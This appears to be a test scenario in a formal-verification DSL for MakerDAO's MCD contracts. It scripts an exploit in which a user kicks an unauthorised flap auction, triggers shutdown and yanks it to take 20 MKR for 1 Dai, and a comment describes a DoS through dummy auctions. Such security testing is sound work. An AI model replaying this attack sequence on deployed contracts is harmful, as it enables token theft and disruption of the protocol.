STEPS ( DEPLOY-PRELUDE )
STEPS ( ATTACK-PRELUDE )

transact ADMIN Gem "MKR" . initUser Vow

// Attack Sequence
// ---------------

// Give Bobby some MKR
transact ADMIN Gem "MKR" . mint "Bobby" wad(20)

// Cheat a little to get a Flap auction started w/o going through full surplus generation cycle
// (dump sin into the End, out-of-sight of the accounting logic)
transact ADMIN Vat . suck End Vow rad(1 ether)
transact ADMIN Vow . flap

// Bobby bids on flap auction
transact "Bobby" Flap . tend 1 rad(1 ether) wad(20)

transact "Alice" Vat . hope Flap
transact "Alice" Flap . kick rad(1) wad(20) // step that shouldn't go through

transact ADMIN End . cage
transact "Alice" Flap . yank 2

// Now Alice has 20 MKR, at the cost of 1 Dai

// If the `End . cage` doesn't go through, Alice could still create dummy auctions to just burn MKR for low collateral amount.
// This would DoS the remaining auctions because they wouldn't have the MKR to pay out on finishing.

assert

.MCDSteps
